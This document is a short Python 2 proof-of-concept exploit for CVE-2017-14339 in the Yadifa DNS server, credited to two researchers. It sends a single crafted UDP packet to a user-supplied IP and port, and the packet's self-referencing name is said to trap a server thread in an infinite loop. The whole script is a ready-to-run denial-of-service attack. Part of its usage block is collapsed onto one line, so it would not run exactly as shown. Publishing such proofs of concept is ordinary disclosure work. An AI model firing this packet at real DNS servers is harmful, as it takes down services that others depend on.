    # Yadifa DoS PoC (CVE-2017-14339)
    # Discovered by: Javier Gil (@ca0s_) & Juan Manuel Fernandez (@TheXC3LL)
    # Description: this packet makes a thread enter in a infinite loop becase a self-reference is used. More details at https://www.tarlogic.com/blog/fuzzing-yadifa-dns/
    
    import socket
    import sys
    if __name__ == '__main__':
            if len(sys.argv) < 2: print "Usage: %s IP [PORT]" % (sys.argv[0], ) sys.exit(-1) IP = sys.argv[1] if len(sys.argv) >= 3:
                    PORT = int(sys.argv[2])
            else:
                    PORT = 53
            exploit = "3132000000010000000001010a6b61306c6162732d000100000e100006036e7336c00cc02300"
            print "[+] Yadifa DoS PoC"
            print "[+] Sending packet..."
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
            sock.sendto(exploit.decode("hex"), (IP, PORT))
            print "[+] Sent!"
